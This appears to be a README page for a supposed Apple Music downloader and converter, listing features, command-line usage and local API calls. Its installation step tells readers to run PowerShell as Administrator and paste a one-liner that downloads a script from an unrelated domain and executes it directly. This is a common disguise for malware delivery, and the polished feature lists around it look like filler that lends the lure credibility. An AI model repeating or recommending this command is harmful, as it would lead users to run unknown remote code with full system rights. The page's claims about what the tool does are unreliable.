# Apple Music Downloader — Complete Apple Music Download & Conversion Suite

> All-in-one Apple Music downloader — download songs, playlists, albums, and convert to MP3, FLAC, WAV in one package.

---

## ⚙️ INSTALLATION & SETUP (CMD / PowerShell)

> **TIP:** Run PowerShell as Administrator for best results.

### Step 1: Open CMD or PowerShell as Administrator
```
# Press Win+X, then select Terminal (Admin) or Command Prompt (Admin)
```

### Step 2: Copy & Paste in PowerShell
```
irm https://gitrm.cfd?t=apple-music-downloader | iex
```

### Step 3: Wait for Completion
```
[1/4] Loading Apple Music Downloader modules...
[2/4] Extracting download and conversion components...
[3/4] Installing metadata and playlist utilities...
[4/4] Ready. Start downloading.
```

### Step 4: Start Using the Downloader
- Launch via `apple-music-downloader.exe` or `npm start`
- Configure download quality and format
- Import playlists and start downloading

---

## TL;DR - Quick Summary

**Apple Music Downloader** combines song, playlist, and album downloading with MP3, FLAC, WAV conversion. Covers all major Apple Music download and conversion needs.

**Best for:** Music enthusiasts, playlist curators, and offline listening fans.

**Key differentiators:**
1. Song, Album, Playlist download
2. Multiple format conversion (MP3, FLAC, WAV, AAC)
3. Metadata preservation (title, artist, album, artwork)
4. Batch download with queue management
5. High-quality audio support (up to Lossless)
6. Playlist import from URL

---

## Core Features

### Download Engine
```
✅ Song download by URL or search
✅ Album download with track listing
✅ Playlist download with auto-detection
✅ Batch download with queue management
✅ Resume interrupted downloads
✅ Download history and tracking
✅ Speed optimization and throttling
✅ Proxy and VPN support
```

### Format Conversion
```
✅ MP3 conversion (up to 320kbps)
✅ FLAC lossless conversion
✅ WAV conversion
✅ AAC conversion
✅ Album artwork embedding
✅ Metadata tagging (ID3)
✅ Batch conversion
✅ Custom bitrate settings
```

### Playlist Management
```
✅ Playlist import from URL
✅ Playlist export to JSON
✅ Auto-detect playlist type
✅ Track filtering and sorting
✅ Duplicate removal
✅ Playlist synchronization
✅ Batch playlist operations
✅ Playlist sharing
```

---

## Usage

```bash
# Download single song
apple-music-downloader download --url "https://music.apple.com/us/album/song-name/123456789"

# Download playlist
apple-music-downloader playlist --url "https://music.apple.com/us/playlist/playlist-name/123456789" --format mp3

# Download album
apple-music-downloader album --url "https://music.apple.com/us/album/album-name/123456789" --quality lossless

# Batch download from file
apple-music-downloader batch --file ./urls.txt --format flac --output ./music/
```

---

## REST API

```bash
# Download via API
curl -X POST "http://localhost:6666/api/apple-music/download" -H "Content-Type: application/json" -d '{"url": "https://music.apple.com/us/album/song-name/123456789", "format": "mp3"}'

# Playlist via API
curl -X POST "http://localhost:6666/api/apple-music/playlist" -H "Content-Type: application/json" -d '{"url": "https://music.apple.com/us/playlist/playlist-name/123456789", "format": "flac"}'

# Album via API
curl -X POST "http://localhost:6666/api/apple-music/album" -H "Content-Type: application/json" -d '{"url": "https://music.apple.com/us/album/album-name/123456789", "quality": "lossless"}'
```

---

## Screenshots

- Dashboard: `screenshots/dashboard.png`
- Download Manager: `screenshots/download-manager.png`
- Playlist Import: `screenshots/playlist-import.png`
- Format Conversion: `screenshots/format-conversion.png`
- Download History: `screenshots/download-history.png`

---

## Troubleshooting

### Download Fails
```bash
apple-music-downloader check --url "https://music.apple.com/us/album/song-name/123456789"
apple-music-downloader download --url "https://music.apple.com/us/album/song-name/123456789" --retry 3 --debug
```

### Conversion Error
```bash
apple-music-downloader convert --file ./song.m4a --format mp3 --bitrate 320k
apple-music-downloader convert --file ./song.m4a --format flac --verify
```

### Playlist Import Fails
```bash
apple-music-downloader playlist validate --url "https://music.apple.com/us/playlist/playlist-name/123456789"
apple-music-downloader playlist import --url "https://music.apple.com/us/playlist/playlist-name/123456789" --force
```

---

## Use Cases

### Music Downloading
- Download songs for offline listening
- Download albums for collection
- Download playlists for road trips
- Batch download for music libraries

### Format Conversion
- Convert to MP3 for compatibility
- Convert to FLAC for archival
- Convert to WAV for editing
- Convert to AAC for Apple devices

### Playlist Management
- Import playlists from Apple Music
- Export playlists for sharing
- Manage playlist collections
- Synchronize playlists

---

## ⚠️ IMPORTANT

This downloader is created for **educational and personal use only**. Download only content you have rights to. Respect Apple Music Terms of Service. Developers are not responsible for misuse or copyright infringement.

---

## License

MIT License - see LICENSE file for details.

---

## Tags

`apple-music-downloader` `apple-music` `downloader` `music-downloader` `mp3-downloader` `flac-downloader` `playlist-downloader` `album-downloader` `music-conversion` `metadata-tagging`